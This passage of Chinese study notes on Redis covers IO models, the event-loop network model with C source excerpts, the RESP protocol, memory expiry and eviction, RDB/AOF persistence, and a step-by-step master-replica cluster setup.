`list_head`拷贝完成后，当通知后数据未处理完成，且采用ET，则`list_head`中对应的就绪FD就被彻底移除了；如果采用LT，则对应的就绪FD会被再次添加到`list_head`中。

举个例子：

1. 假设一个客户端socket对应的FD已经注册到了`epoll`实例中。
2. 客户端socket发送了2KB的数据。
3. 服务端调用`epoll_wait`，得到通知说FD就绪。
4. 服务端从FD读取了1KB数据。
5. 回到步骤3（再次调用`epoll_wait`，形成循环）。

结果：

- 如果我们采用LT模式，因为FD中仍有1KB数据，则第5步依然会返回结果，并且得到通知。
- 如果我们采用ET模式，因为第3步已经消费了FD可读事件，第5步FD状态没有变化，因此`epoll_wait`不会返回，数据无法读取，客户端响应超时。

结论：

- LT：事件通知频率较高，会有重复通知，影响性能。同时还会出现惊群现象。

- ET：仅通知一次，效率高。如果要使用ET模式，则可以更改读取方式解决数据残留问题：
  - 每次读取数据后，如果还有数据，手动重新将对应的FD添加回`list_head`（通过`epoll_ctl`函数），等同于LT，同样影响性能。
  - 可以基于非阻塞IO循环读取解决数据读取不完整问题（不能使用阻塞IO模式，因为阻塞IO会在FD中没有数据时一直等待，直到有数据为止，导致整个进程阻塞）。

结论：

- ET模式避免了LT模式可能出现的惊群现象。ET模式最好结合非阻塞IO读取FD数据，相比LT会复杂一些。


- `select`和`poll`仅支持LT模式，`epoll`可以自由选择LT和ET两种模式。

### web服务流程

基于`epoll`模式的web服务的基本流程如图：

![基于epoll模式的web服务的基本流程](资源\基于epoll模式的web服务的基本流程.png)

## 信号驱动IO

**信号驱动IO**是与内核建立SIGIO的信号关联并设置回调，当内核有FD就绪时，会发出SIGIO信号通知用户，期间用户应用可以执行其它业务，无需阻塞等待。

阶段一：

- 用户进程调用`sigaction`，注册信号处理函数。
- 内核返回成功，开始监听FD。
- 用户进程不阻塞等待，可以执行其它业务。
- 当内核数据就绪后，回调用户进程的SIGIO处理函数。

阶段二：

- 用户进程收到SIGIO回调信号。
- 用户进程调用`recvfrom`，读取数据。
- 内核将数据拷贝到用户空间（需要等待）。
- 用户进程处理数据。

当有大量IO操作时，信号较多，SIGIO处理函数不能及时处理可能导致信号队列溢出，而且内核空间与用户空间的频繁信号交互性能也较低（需要频繁地将信号从内核空间拷贝到用户空间）。

## 异步IO

异步IO的整个过程都是非阻塞的，用户进程调用完异步API后就可以去做其它事情，内核等待数据就绪并拷贝到用户空间后才会递交信号，通知用户进程。

阶段一：

- 用户进程调用`aio_read`，创建信号回调函数。
- 内核等待数据就绪。
- 用户进程无需阻塞，可以做任何事情。

阶段二：

- 内核数据就绪。
- 内核数据拷贝到用户缓冲区。
- 拷贝完成，内核递交信号触发`aio_read`中的回调函数。
- 用户进程处理数据。

可以看到，异步IO模型中，用户进程在两个阶段都是非阻塞状态。使用异步IO需要对并发访问限流，否则内核将处理大量IO任务，不堪重负，甚至导致系统崩溃。

IO操作是同步还是异步，关键看数据在内核空间与用户空间的拷贝过程（数据读写的IO操作），也就是阶段二是同步还是异步：

![五个IO模型的比较](资源\五个IO模型的比较.png)

注意，阻塞I/O、非阻塞I/O、I/O复用与信号驱动I/O都是同步IO。

## Redis网络模型

Redis到底是单线程还是多线程？

- 如果仅仅聊Redis的核心业务部分（命令处理），答案是单线程。
- 如果是聊整个Redis，那么答案就是多线程。

在Redis版本迭代过程中，在两个重要的时间节点上引入了多线程的支持：

- Redis v4.0：引入多线程异步处理一些耗时较久的任务，例如异步删除命令`unlink`。
- Redis v6.0：在核心网络模型中引入多线程，进一步提高对于多核CPU的利用率。

因此，对于Redis的核心网络模型，在Redis 6.0之前确实都是单线程。是利用`epoll`（Linux系统）这样的IO多路复用技术在事件循环中不断处理客户端情况。

为什么Redis要选择单线程？

- 抛开持久化不谈，Redis是纯内存操作，执行速度非常快，它的性能瓶颈是网络延迟而不是执行速度，因此多线程并不会带来巨大的性能提升。
- 多线程会导致过多的上下文切换，带来不必要的开销。
- 引入多线程会面临线程安全问题，必然要引入线程锁这样的安全手段，实现复杂度增高，而且性能也会大打折扣。而且与老Redis版本之间还会存在兼容性问题。

Redis通过IO多路复用来提高网络性能，并且支持各种不同的多路复用实现，并且将这些实现进行封装， 提供了统一的高性能事件库API库AE：`ae_epoll.c`（Linux系统的实现）、`ae_evport.c`（Solaris系统的实现）、`ae_kqueue.c`（Unix系统及其衍生版本的实现）与`ae_select.c`（跨平台的、大部分系统支持的实现）。`ae.c`根据系统环境选择相应的实现：

```c
/* ae.c */
#ifdef HAVE_EVPORT
#include "ae_evport.c"
#else
    #ifdef HAVE_EPOLL
    #include "ae_epoll.c"
    #else
        #ifdef HAVE_KQUEUE
        #include "ae_kqueue.c"
        #else
        #include "ae_select.c"
        #endif
    #endif
#endif
```

AE提供的API包括：

- `aeApiCreate(aeEventLoop *)`：创建多路复用程序，类似`epoll_create`函数。
- `aeApiResize(aeEventLoop *, int)`。
- `aeApiFree(aeEventLoop *)`。
- `aeApiAddEvent(aeEventLoop *, int, int)`：注册FD，类似`epoll_ctl(op=ADD)`。
- `aeApiDelEvent(aeEventLoop *, int, int)`：删除FD，`epoll_ctl(op=DEL)`。
- `aeApiPoll(aeEventLoop *, timeval *)`：等待FD就绪，类似`epoll_wait`、`select`与`poll`。
- `aeApiName(void)`。

来看下Redis单线程网络模型的整个流程：

```c
// 位于server.c中
int main(
    int argc,
    char **argv
) {
    // ...
    // 初始化服务
    initServer();
    // ...
    // 开始监听事件循环
    aeMain(server.el);
    // ...
}
```

```c
void initServer(void) {
    // ...
    // 内部会调用aeApiCreate(eventLoop)
    server.el = aeCreateEventLoop(
                    server.maxclients+CONFIG_FDSET_INCR);
    // ...
    // 监听TCP端口，创建ServerSocket，并得到FD
    listenToPort(server.port,&server.ipfd)
    // ...
    // 注册连接处理器，内部会调用aeApiAddEvent(&server.ipfd)监听FD；设置事件处理器（一旦ServerSocket就绪，就会调用该处理器）
    createSocketAcceptHandler(&server.ipfd, acceptTcpHandler)
    // 注册ae_api_poll前的处理器（epoll_wait等待时线程可能休眠直到就绪，在调用epoll_wait之前需要做一些准备工作）
    aeSetBeforeSleepProc(server.el,beforeSleep);
}
```

```c
void aeMain(aeEventLoop *eventLoop) {
    eventLoop->stop = 0;
    // 循环监听事件
    while (!eventLoop->stop) {
        aeProcessEvents(
            eventLoop, 
            AE_ALL_EVENTS|
                AE_CALL_BEFORE_SLEEP|
                AE_CALL_AFTER_SLEEP);
    }
}
```

```c
int aeProcessEvents(
    aeEventLoop *eventLoop,
    int flags ){
    // ...  调用前置处理器beforeSleep
    eventLoop->beforesleep(eventLoop);
    // 等待FD就绪，类似epoll_wait
    numevents = aeApiPoll(eventLoop, tvp);
    for (j = 0; j < numevents; j++) {
        // 遍历处理就绪的FD，调用对应的处理器（例如ServerSocket的acceptTcpHandler）
    }
}
```

```c
// 数据读处理器
void acceptTcpHandler(...) {
    // ...
    // 接收socket连接，获取FD
    fd = accept(s,sa,len);
    // ...
    // 创建connection，关联FD
    connection *conn = connCreateSocket();
    conn.fd = fd;
    // ... 
    // 内部调用aeApiAddEvent(fd,READABLE)，
    // 监听socket的FD读事件，并绑定读处理器readQueryFromClient（目前有两个处理器：acceptTcpHandler与readQueryFromClient，前者用于处理ServerSocket上的读事件，后者用于处理客户端socket上的读事件）
    connSetReadHandler(conn, readQueryFromClient);
}
```

```c
void readQueryFromClient(connection *conn) {
    // 获取当前客户端，客户端中有缓冲区用来读和写
    client *c = connGetPrivateData(conn);
    // 获取c->querybuf缓冲区大小
    long int qblen = sdslen(c->querybuf);
    // 读取请求数据到c->querybuf缓冲区（输入缓冲区）
    connRead(c->conn, c->querybuf+qblen, readlen);
    // ... 
    // 解析缓冲区字符串，转为Redis命令参数存入c->argv数组
    processInputBuffer(c);
    // ...
    // 处理c->argv中的命令
    processCommand(c);
}
int processCommand(client *c) {
    // ...
    // 根据命令名称，寻找命令对应的command，例如setCommand
    c->cmd = c->lastcmd = lookupCommand(c->argv[0]->ptr);
    // ...
    // 执行command，得到响应结果，例如ping命令，对应pingCommand
    c->cmd->proc(c);
    // 把执行结果写出，例如ping命令，就返回"pong"给client，
    // shared.pong是 字符串"pong"的SDS对象
    addReply(c,shared.pong); 
}
void addReply(client *c, robj *obj) {
    // 尝试把结果写到客户端缓冲区c->buf（输出缓冲区）
    if (_addReplyToBuffer(c,obj->ptr,sdslen(obj->ptr)) != C_OK)
            // 如果c->buf写不下，则写到 c->reply，这是一个链表，容量无上限（输出缓冲区）
            _addReplyProtoToList(c,obj->ptr,sdslen(obj->ptr));
    // 将客户端添加到server.clients_pending_write这个队列，等待被写出
    listAddNodeHead(server.clients_pending_write,c);
}
```

```c
void beforeSleep(struct aeEventLoop *eventLoop){
    // ...
    // 定义迭代器，指向server.clients_pending_write->head;
    listIter li;
    li->next = server.clients_pending_write->head;
    li->direction = AL_START_HEAD;
    // 循环遍历待写出的client
    while ((ln = listNext(&li))) {
        // 内部调用aeApiAddEvent(fd，WRITEABLE)，监听socket的FD读事件
        // 并且绑定写处理器sendReplyToClient，可以把响应写到客户端socket
        connSetWriteHandlerWithBarrier(c->conn, sendReplyToClient, ae_barrier)
    }
}
```

流程如下：

![Redis单线程网络模型的整个流程](资源\Redis单线程网络模型的整个流程.png)

整体思想就是IO多路复用+事件派发。

Redis 6.0版本中引入了多线程，目的是为了提高IO读写效率。因此在解析客户端命令、写响应结果时采用了多线程。核心的命令执行、IO多路复用模块依然是由主线程执行。

![Redis网络模型的整个流程](资源\Redis网络模型的整个流程.png)

# Redis通信协议

## RESP协议

Redis是一个CS架构的软件，通信一般分两步（不包括pipeline和PubSub）：

- 客户端（client）向服务端（server）发送一条命令。
- 服务端解析并执行命令，返回响应结果给客户端。

因此客户端发送命令的格式、服务端响应结果的格式必须有一个规范，这个规范就是通信协议。

而在Redis中采用的是**RESP（Redis Serialization Protocol）**协议：

- Redis 1.2版本引入了RESP协议。
- Redis 2.0版本中成为与Redis服务端通信的标准，称为RESP2。
- Redis 6.0版本中，从RESP2升级到了RESP3协议，增加了更多数据类型并且支持6.0的新特性——客户端缓存。

在Redis 6.0版本中，默认使用的依然是RESP2协议（RESP 2与3存在兼容性问题），也是我们要学习的协议版本（以下简称RESP）。

## 数据类型

在RESP中，通过首字节的字符来区分不同数据类型，常用的数据类型包括5种：

- 单行字符串：首字节是 `+` ，后面跟上单行字符串，以CRLF（ `\r\n` ）结尾。例如返回`OK`： `+OK\r\n`。

- 错误（Errors）：首字节是 `-` ，与单行字符串格式一样，只是字符串是异常信息，例如：`-Error message\r\n`（`-[异常类型] [详细信息]\r\n`））。一般是服务端响应时出现。

- 数值：首字节是`:`，后面跟上数字格式的字符串，以CRLF结尾。例如：`:10\r\n`。

- 多行字符串：首字节是`$`，表示二进制安全的字符串，最大支持512MB。多行字符串需要传递字符串占用的字节大小与真正的字符串数据，字节大小有两类特殊值：

  - 如果大小为0，则代表空字符串：`$0\r\n\r\n`。
  - 如果大小为-1，则代表不存在：`$-1\r\n`。

- 数组：首字节是 `*`，后面跟上数组元素个数，再跟上元素，元素数据类型不限。例如（`\r\n`表示CRLF）：

  ```c
  *3\r\n $3\r\nset\r\n$4\r\nname\r\n$6\r\n虎哥\r\n
  ```

  ```c
  *3\r\n:10\r\n$5\r\nhello\r\n*2\r\n$3\r\nage\r\n:10\r\n
  ```

不管是客户端发送的命令还是服务端响应的返回结果，只要是传输的数据，都必须是以上五种类型中的一种。多数情况下，客户端发送的命令都是数组格式，且数组中的元素多是字符串；而服务端响应的数据格式则五花八门。

# Redis内存策略

Redis之所以性能强，最主要的原因就是基于内存存储。然而单节点的Redis其内存大小不宜过大，会影响持久化或主从同步性能。

我们可以通过修改配置文件来设置Redis的最大内存：

```sh
# 格式：maxmemory <bytes>
maxmemory 1gb
```

当内存使用达到上限时，就无法存储更多数据了。为了解决这个问题，Redis提供了一些策略实现内存回收：

- 内存过期策略。
- 内存淘汰策略。

## 过期策略

可以通过`expire`命令给Redis的键设置TTL（存活时间）。当键的TTL到期以后，再次访问键返回的是`nil`，说明这个键已经不存在了，对应的内存也得到释放。从而起到内存回收的目的。

这里需要关注两点：

- Redis利用两个`Dict`分别记录键值对及键-TTL对，来知道一个键是否过期。

- 不是TTL到期键立即删除，键可以被惰性删除或周期删除。

Redis本身是一个典型的键值内存存储数据库，因此所有的键、值都保存在之前学习过的`Dict`结构中。不过在其数据库结构体中，有两个`Dict`：一个用来记录键值；另一个用来记录键的TTL。

```c
typedef struct redisDb {
    dict *dict;  // 存放所有键与值的地方，也被称为keyspace
    dict *expires;  // 存放每一个键及其对应的TTL存活时间，只包含设置了TTL的键
    dict *blocking_keys;  // Keys with clients waiting for data (BLPOP)
    dict *ready_keys;  // Blocked keys that received a PUSH
    dict *watched_keys;  // WATCHED keys for MULTI/EXEC CAS
    int id;  // Database ID，0~15
    long long avg_ttl;  // 记录平均TTL时长
    unsigned long expires_cursor;  // expire检查时在dict中抽样的索引位置
    list *defrag_later;  // 等待碎片整理的key列表
} redisDb;
```

### 惰性删除

惰性删除：顾名思义并不是在TTL到期后就立刻删除，而是在访问一个键的时候，检查该键的存活时间，如果已经过期才执行删除。

```c
// 查找一个键执行写操作
robj *lookupKeyWriteWithFlags(redisDb *db, robj *key, int flags) {
    // 检查键是否过期
    expireIfNeeded(db,key);
    return lookupKey(db,key,flags);
}
// 查找一个键执行读操作
robj *lookupKeyReadWithFlags(redisDb *db, robj *key, int flags) {
    robj *val;
    // 检查键是否过期
    if (expireIfNeeded(db,key) == 1) {
        // ...略
    }
    return NULL;
}
```

```c
int expireIfNeeded(redisDb *db, robj *key) {
    // 判断是否过期，如果未过期直接结束并返回0
    if (!keyIsExpired(db,key)) return 0;
    // ... 略
    // 删除过期的键
    deleteExpiredKeyAndPropagate(db,key);
    return 1;
}
```

在惰性删除模式下，如果键一直没有访问，则它会一直占用内存。

### 周期删除

周期删除：顾名思义是通过一个定时任务，周期性地抽样部分过期的键，然后执行删除。执行周期有两种：

- Redis服务初始化函数`initServer()`中设置定时任务`serverCron()`，按照`server.hz`（可配置）的频率来执行过期键清理，模式为`SLOW`（执行时间长、频率低）。

  ```c
  // server.c
  void initServer(void){
      // ...
      // 创建定时器（1毫秒后执行），关联回调函数serverCron，处理周期取决于server.hz，默认10
      aeCreateTimeEvent(server.el, 1, serverCron, NULL, NULL) 
  }
  ```

  ```c
  // server.c
  int serverCron(struct aeEventLoop *eventLoop, long long id, void *clientData) {
      // 更新lruclock到当前时间，为后期的LRU和LFU做准备
      unsigned int lruclock = getLRUClock();
      atomicSet(server.lruclock,lruclock);
      // 执行数据库的数据清理，例如过期键处理
      databasesCron();
      return 1000/server.hz;  // 下一次执行的间隔
  }
  ```

  ```c
  void databasesCron(void) {
      // 尝试清理部分过期键，清理模式默认为SLOW
      activeExpireCycle(
            ACTIVE_EXPIRE_CYCLE_SLOW);
  }
  ```

- Redis的每个事件循环前会调用`beforeSleep()`函数，执行过期键清理，模式为`FAST`（执行时间段、频率高）。

  ```c
  void beforeSleep(struct aeEventLoop *eventLoop){
      // ...
      // 尝试清理部分过期键，清理模式默认为FAST
      activeExpireCycle(
           ACTIVE_EXPIRE_CYCLE_FAST);
  }
  ```

```c
void aeMain(aeEventLoop *eventLoop) {
    eventLoop-> stop = 0;
    // beforeSleep() -> Fast模式清理
    // n = aeApiPoll();
    // 如果n > 0，FD就绪，处理IO事件
    // 如果到了执行时间，则调用serverCron() -> SLOW模式清理
}
```

SLOW模式规则：

- 执行频率受`server.hz`影响，默认为10，即每秒执行10次，每个执行周期100ms。
- 执行清理耗时不超过一次执行周期的25%。默认SLOW模式耗时不超过25ms。
- 逐个遍历db（所有库），逐个遍历db中的bucket，抽取20个键判断是否过期。遍历后会记录当前遍历进度（bucket的下标）。
- 如果没达到时间上限（25ms）并且（全局的）过期键比例大于10%，再进行一次抽样，否则结束。

FAST模式规则（过期键比例小于10%不执行）：

- 执行频率受`beforeSleep()`调用频率影响，但两次FAST模式间隔不低于2ms。
- 执行清理耗时不超过1ms。
- 逐个遍历db，逐个遍历db中的bucket，抽取20个键判断是否过期。
- 如果没达到时间上限（1ms）并且过期键比例大于10%，再进行一次抽样，否则结束。

## 淘汰策略

内存淘汰：就是当Redis内存使用达到设置的上限时，主动挑选部分键删除以释放更多内存的流程。Redis会在处理客户端命令的方法`processCommand()`中尝试做内存淘汰：

```c
int processCommand(client *c) {
    // 如果服务器设置了server.maxmemory属性，并且没有执行lua脚本
    if (server.maxmemory && !server.lua_timedout) {
        // 尝试进行内存淘汰performEvictions
        int out_of_memory = (performEvictions() == EVICT_FAIL);
        // ...
        if (out_of_memory && reject_cmd_on_oom) {
            rejectCommand(c, shared.oomerr);
            return C_OK;
        }
        // ....
    }
}
```

Redis支持8种不同策略来选择要删除的键：

- `noeviction`： 不淘汰任何键，但是内存满时不允许写入新数据，默认就是这种策略。可以通过配置文件配置：`maxmemory-policy=[策略]`，默认为`noeviction`。
- `volatile-ttl`： 对设置了TTL的键，比较键的剩余TTL值，TTL越小越先被淘汰。
- `allkeys-random`：对全体键，随机进行淘汰。也就是直接从`db->dict`中随机挑选。
- `volatile-random`：对设置了TTL的键，随机进行淘汰。也就是从`db->expires`中随机挑选。
- `allkeys-lru`： 对全体键，基于LRU算法进行淘汰。
- `volatile-lru`： 对设置了TTL的键，基于LRU算法进行淘汰。
- `allkeys-lfu`： 对全体键，基于LFU算法进行淘汰。
- `volatile-lfu`： 对设置了TTL的键，基于LFU算法进行淘汰。

比较容易混淆的有两个：

- LRU（Least Recently Used），最少最近使用。用当前时间减去最后一次访问时间，这个值越大则淘汰优先级越高。

- LFU（Least Frequently Used），最少频率使用。会统计每个键的访问频率，值越小淘汰优先级越高。

Redis的数据都会被封装为RedisObject结构：

```c
typedef struct redisObject {
    unsigned type:4;  // 对象类型
    unsigned encoding:4;  // 编码方式
    unsigned lru:LRU_BITS;  // LRU：以秒为单位记录最近一次访问时间，长度24bit；LFU：高16位以分钟为单位记录最近一次访问时间，低8位记录逻辑访问次数
    int refcount;  // 引用计数，计数为0则可以回收
    void *ptr;  // 数据指针，指向真实数据
} robj;
```

LFU的访问次数之所以叫做逻辑访问次数，是因为并不是每次键被访问都计数，而是通过运算：

- 生成0~1之间的随机数$R$。
- 计算$1/(旧次数 * lfu\_log\_factor + 1)$，记录为$P$，$lfu\_log\_factor$默认为10。
- 如果 $R < P$ ，则计数器+1，且最大不超过255。
- 访问次数会随时间衰减，距离上一次访问时间每隔$lfu\_decay\_time$分钟（默认为1），计数器 -1。

$lfu\_log\_factor$与$lfu\_decay\_time$可以通过`config set`命令或配置文件配置。

淘汰策略流程如下（`performEvictions()`的过程）：

![淘汰策略](资源\淘汰策略.png)

其中，如果`eviction_pool`已满，则接下来放入`eviction_pool`中的键的`idleTime`要大于`eviction_pool`中`idleTime`最小的键的`idleTime`，且后者会从`eviction_pool`中移除。这样，随着时间推移，`eviction_pool`中的键越来越接近全局最应该淘汰的键，从而更接近真实的LRU、LFU等。

# 分布式缓存

## 单点Redis的问题

单机的Redis存在四大问题：

- 数据丢失问题：Redis是内存存储，服务重启可能会丢失数据。
- 并发能力问题：单节点Redis并发能力虽然不错，但也无法满足如618这样的高并发场景。
- 故障恢复问题：如果Redis宕机，则服务不可用，需要一种自动的故障恢复手段。
- 存储能力问题：Redis基于内存，单节点能存储的数据量难以满足海量数据需求。

基于Redis集群解决单机Redis存在的问题：

- 数据丢失问题：实现Redis数据持久化。
- 并发能力问题：搭建主从集群，实现读写分离。
- 故障恢复问题：利用Redis哨兵，实现健康检测和自动恢复。
- 存储能力问题：搭建分片集群，利用插槽机制实现动态扩容。

## Redis持久化

Redis有两种持久化方案：

- RDB持久化
- AOF持久化

### RDB持久化

RDB全称为Redis Database Backup file（Redis数据备份文件），也被叫做Redis数据快照。简单来说就是把内存中的所有数据都记录到磁盘中。当Redis实例故障重启后，从磁盘读取快照文件，恢复数据。

快照文件称为RDB文件，默认是保存在当前运行目录。

#### 执行时机

RDB持久化在四种情况下会执行：

- 执行`save`命令：执行`save`命令，可以立即执行一次RDB。`save`命令会导致主进程执行RDB，这个过程中其它所有命令都会被阻塞。只有在数据迁移时可能用到。
- 执行`bgsave`命令：`bgsave`命令可以异步执行RDB。这个命令执行后会开启独立进程（子进程）完成RDB，主进程可以持续处理用户请求，不受影响。
- Redis停机时：Redis停机时会执行一次`save`命令，实现RDB持久化。
- 触发RDB条件时。

Redis内部有触发RDB的机制，可以在redis.conf文件中找到，格式如下：

```ini
# 表示M秒内，如果至少N个键被修改，则执行bgsave
save 900 1
save 300 10
save 60 10000
# 以下配置表示禁用RDB
save ""
```

RDB的其它配置也可以在redis.conf文件中设置：

```ini
# 是否压缩，建议不开启，压缩也会消耗cpu，磁盘的话不值钱
rdbcompression yes

# RDB文件名称
dbfilename dump.rdb

# 文件保存的路径目录
# 这里表示保存在当前运行目录下
# 
dir ./
```

注意这些配置更改后，下次启动Redis可能无法读取原来的RDB文件。

#### RDB原理

`bgsave`开始时会fork主进程得到子进程，子进程共享主进程的内存数据。完成fork后子进程读取内存数据并写入RDB文件，替换旧RDB文件。

主进程会将页表拷贝给子进程，这样子进程与主进程就能映射到相同的物理内存区域，实现子进程与主进程的内存空间共享。子进程将数据异步地写入RDB文件，替换旧的RDB文件。

fork采用copy-on-write技术解决主进程与子进程的读写冲突：fork操作时，共享内存空间被标记为read-only，当主进程执行读操作时，访问共享内存；当主进程执行写操作时，则会拷贝一份数据，执行写操作（并修改主进程的页表映射关系，主进程之后读取该数据时就会访问拷贝的数据）。在极端情况下，所有数据都要被拷贝，内存翻倍。因此，Redis一般要预留一些内存空间。

![RDB原理](资源\RDB原理.png)

RDB的缺点在于：

- RDB执行间隔时间长，两次RDB之间写入数据有丢失的风险。
- fork子进程、压缩、写出RDB文件都比较耗时。

### AOF持久化

#### AOF原理

AOF全称为Append Only File（追加文件）。Redis处理的每一个写命令都会记录在AOF文件，可以看做是命令日志文件。

如果要恢复Redis，则可以读取AOF文件，将其中命令读取一遍并执行即可。

对于命令`set num 123`，Redis生成的文件格式如下：

```
$3
set
$3
num
$3
123
```

#### AOF配置

AOF默认是关闭的，需要修改redis.conf配置文件来开启AOF：

```ini
# 是否开启AOF功能，默认是no
appendonly yes
# AOF文件的名称
appendfilename "appendonly.aof"
```

AOF的命令记录的频率也可以通过redis.conf文件来配：

```ini
# 表示每执行一次写命令，立即记录到AOF文件
# 主进程执行，记录完成请求（内存与磁盘操作必须都完成）才算处理完毕，结果才能返回
appendfsync always
# 写命令执行完先放入AOF缓冲区，然后表示每隔1秒将缓冲区数据写到AOF文件，是默认方案
appendfsync everysec
# 写命令执行完先放入AOF缓冲区，由操作系统决定何时将缓冲区内容写回磁盘
appendfsync no
```

三种策略对比：

| 配置项     | 刷盘时机     | 优点                   | 缺点                         |
| ---------- | ------------ | ---------------------- | ---------------------------- |
| `always`   | 同步刷盘     | 可靠性高，几乎不丢数据 | 性能影响大                   |
| `everysec` | 每秒刷盘     | 性能适中               | 最多丢失1秒数据              |
| `no`       | 操作系统控制 | 性能最好               | 可靠性较差，可能丢失大量数据 |

停止Redis服务器时，也会记录AOF。

#### AOF文件重写

因为是记录命令，AOF文件会比RDB文件大的多。而且AOF会记录对同一个键的多次写操作，但只有最后一次写操作才有意义。通过执行`bgrewriteaof`命令，可以让AOF文件执行重写功能（后台独立进程执行），用最少的命令达到相同效果。

如图，AOF原本有三个命令：`set num 123`、`set name jack`、`set num 666`，但是`set num 123` 和 `set num 666`都是对`num`的操作，第二次会覆盖第一次的值，因此第一个命令记录下来没有意义。

所以重写命令后，AOF文件内容就是：`mset name jack num 666`

Redis也会在触发阈值时自动去重写AOF文件。阈值也可以在redis.conf中配置：

```ini
# AOF文件比上次文件增长超过多少百分比才触发重写
auto-aof-rewrite-percentage 100
# AOF文件体积最小多大以上才触发重写
auto-aof-rewrite-min-size 64mb
```

#### RDB与AOF对比

RDB和AOF各有自己的优缺点，如果对数据安全性要求较高，在实际开发中往往会结合两者来使用。

|                | RDB                                          | AOF                                                      |
| -------------- | -------------------------------------------- | -------------------------------------------------------- |
| 持久化方式     | 定时对整个内存做快照                         | 记录每一次执行的命令                                     |
| 数据完整性     | 不完整，两次备份之间会丢失                   | 相对完整，取决于刷盘策略                                 |
| 文件大小       | 会有压缩，文件体积小                         | 记录命令，文件体积很大                                   |
| 宕机恢复速度   | 很快                                         | 慢                                                       |
| 数据恢复优先级 | 低，因为数据完整性不如AOF                    | 高，因为数据完整性更高                                   |
| 系统资源占用   | 高，大量CPU和内存消耗                        | 低，主要是磁盘IO资源，但AOF重写时会占用大量CPU和内存资源 |
| 使用场景       | 可以容忍数分钟的数据丢失，追求更快的启动速度 | 对数据安全性要求较高常见                                 |

## Redis主从

### 搭建主从架构

单节点Redis的并发能力是有上限的，要进一步提高Redis的并发能力，就需要搭建主从集群，实现读写分离。

![Redis主从架构](资源\Redis主从架构.png)

在主从集群模式下，Redis包含一个主节点master以及多个从节点replica（5.0前称为slave）。之所以搭建主从集群，而不是传统的负载均衡集群，是因为Redis应用中通常读多写少。Redis客户端的写操作访问主结点，而读操作则分发到从结点。多个从节点共同承担读请求，提升读并发能力。

#### 集群结构

下面搭建的主从集群结构共包含三个节点，一个主节点，两个从节点。

这里会在同一台虚拟机中开启3个redis实例，模拟主从集群，信息如下：

|       IP        | PORT |  角色  |
| :-------------: | :--: | :----: |
| 192.168.150.101 | 7001 | master |
| 192.168.150.101 | 7002 | slave  |
| 192.168.150.101 | 7003 | slave  |

#### 准备实例和配置

要在同一台虚拟机开启3个实例，必须准备三份不同的配置文件和目录，配置文件所在目录也就是工作目录。

#### 创建目录

创建三个文件夹，名字分别叫7001、7002、7003：

```sh
# 进入/tmp目录
cd /tmp
# 创建目录
mkdir 7001 7002 7003
```

#### 恢复原始配置

修改redis-6.2.7/redis.conf文件，将其中的持久化模式改为默认的RDB模式，AOF保持关闭状态。

```ini
# 开启RDB
# save ""
save 3600 1
save 300 100
save 60 10000

# 关闭AOF
appendonly no
```

#### 拷贝配置文件到每个实例目录

然后将redis-6.2.7/redis.conf文件拷贝到三个目录中：

```sh
# 方式一：逐个拷贝
cp redis-6.2.7/redis.conf 7001
cp redis-6.2.7/redis.conf 7002
cp redis-6.2.7/redis.conf 7003

# 方式二：管道组合命令，一键拷贝
echo 7001 7002 7003 | xargs -t -n 1 cp redis-6.2.4/redis.conf
```

#### 修改每个实例的端口、工作目录

修改每个文件夹内的配置文件，将端口分别修改为7001、7002、7003，将rdb文件保存位置都修改为自己所在目录：

```sh
sed -i -e 's/6379/7001/g' -e 's/dir .\//dir \/tmp\/7001\//g' 7001/redis.conf
sed -i -e 's/6379/7002/g' -e 's/dir .\//dir \/tmp\/7002\//g' 7002/redis.conf
sed -i -e 's/6379/7003/g' -e 's/dir .\//dir \/tmp\/7003\//g' 7003/redis.conf
```

#### 修改每个实例的声明IP

虚拟机本身有多个IP，为了避免将来混乱，我们需要在redis.conf文件中指定每一个实例的绑定IP信息，格式如下：

```sh
# redis实例的声明 IP
replica-announce-ip 192.168.150.101
```

每个目录都要改，我们一键完成修改：

```sh
# 逐一执行
sed -i '1a replica-announce-ip 192.168.150.101' 7001/redis.conf
sed -i '1a replica-announce-ip 192.168.150.101' 7002/redis.conf
sed -i '1a replica-announce-ip 192.168.150.101' 7003/redis.conf

# 或者一键修改
printf '%s\n' 7001 7002 7003 | xargs -I{} -t sed -i '1a replica-announce-ip 192.168.150.101' {}/redis.conf
```

#### 启动

为了方便查看日志，我们打开3个ssh窗口，分别启动3个redis实例，启动命令：

```sh
# 第1个
redis-server 7001/redis.conf
# 第2个
redis-server 7002/redis.conf
# 第3个
redis-server 7003/redis.conf
```

如果要一键停止，可以运行下面命令：

```sh
printf '%s\n' 7001 7002 7003 | xargs -I{} -t redis-cli -p {} shutdown
```

#### 开启主从关系

现在三个实例还没有任何关系，要配置主从可以使用`replicaof`（5.0以后新增）或者`slaveof`（5.0以前）命令。

有临时和永久两种模式：

- 修改配置文件（永久生效）

  - 在redis.conf中添加一行配置：```slaveof <masterip> <masterport>```。

- 使用redis-cli客户端连接到redis服务，执行slaveof命令（重启后失效）：

  ```sh
  slaveof <masterip> <masterport>
  ```

这里为了演示方便，使用方式二。

通过redis-cli命令连接7002，执行下面命令：

```sh
# 连接 7002
redis-cli -p 7002
# 执行slaveof
slaveof 192.168.150.101 7001
```

通过redis-cli命令连接7003，执行下面命令：

```sh
# 连接 7003
redis-cli -p 7003
# 执行slaveof
slaveof 192.168.150.101 7001
```

然后连接 7001节点，查看集群状态：

```sh
# 连接 7001
redis-cli -p 7001
# 查看状态
info replication
```

#### 测试

执行下列操作以测试：

- 利用`redis-cli`连接7001，执行`set num 123`。

- 利用`redis-cli`连接7002，执行`get num`，再执行`set num 666`。

- 利用`redis-cli`连接7003，执行`get num`，再执行`set num 888`。

可以发现，只有在7001这个主节点上可以执行写操作，7002和7003这两个从节点只能执行读操作。

### 主从数据同步原理

#### 全量同步

主从第一次建立连接时，会执行**全量同步**，将主节点的所有数据都拷贝给从节点，流程：

- 第一阶段：

  - 从节点执行`replicaof`（或`slaveof`命令），建立连接。

  - 从节点请求数据同步。

  - 主节点判断是否是第一次同步。

  - 如果是第一次，返回主节点的数据版本信息。

  - 从节点保存版本信息。

- 第二阶段：

  - 主节点执行`bgsave`命令，生成RDB文件。同时主进程还会记录RDB期间的所有命令到repl_baklog的缓冲区中（因为在`bgsave`执行过程中，主进程还会有新的数据写入），后续过程中产生的命令也记录到该缓冲区中。

  - 主节点发送RDB文件。
  - 从节点清空本地数据，加载RDB文件。这样，主从结点的数据就能基本一致。

- 第三阶段

  - 主节点发送repl_baklog中的命令。
  - 从节点执行接收到的命令。

![全量同步](资源\全量同步.png)

